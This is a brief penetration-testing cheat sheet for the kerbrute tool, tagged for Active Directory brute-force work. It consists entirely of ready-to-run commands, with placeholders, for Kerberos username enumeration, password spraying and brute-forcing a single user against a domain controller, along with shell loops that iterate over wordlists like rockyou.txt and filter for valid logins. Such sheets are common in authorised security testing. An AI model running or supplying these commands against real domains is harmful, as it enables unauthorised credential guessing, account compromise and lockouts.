# kerbrute
#target/remote #os/linux #cat/ad #cat/bruteforce

## userenum
```
kerbrute userenum -d <domain> --dc <dc_ip> <userlist|test_users.txt> -t <threads|100>
```

## passwordspray
```
kerbrute passwordspray -d <domain> --dc <dc_ip> <userlist|users.txt> '<password>' -t <threads|100>
```

## bruteuser
```
kerbrute bruteuser -d <domain> --dc <dc_ip> <wordlist|/usr/share/wordlists/rockyou.txt> '<user>' -t <threads|100>
```

## passwordspray (loop)
```
while IFS= read -r password; do kerbrute passwordspray -d <domain> --dc <dc_ip> <userlist|users.txt> $password -t <threads|100>; done < <passwordlist|test_passwords.txt> | grep 'VALID LOGIN'
```

## bruteuser (loop)
```
while IFS= read -r user; do timeout <timeout|60>s kerbrute bruteuser -d <domain> --dc <dc_ip> <passwordlist|/usr/share/wordlists/rockyou.txt> $user -t <threads|100>; done < <userlist|users.txt> | grep 'VALID LOGIN'
```
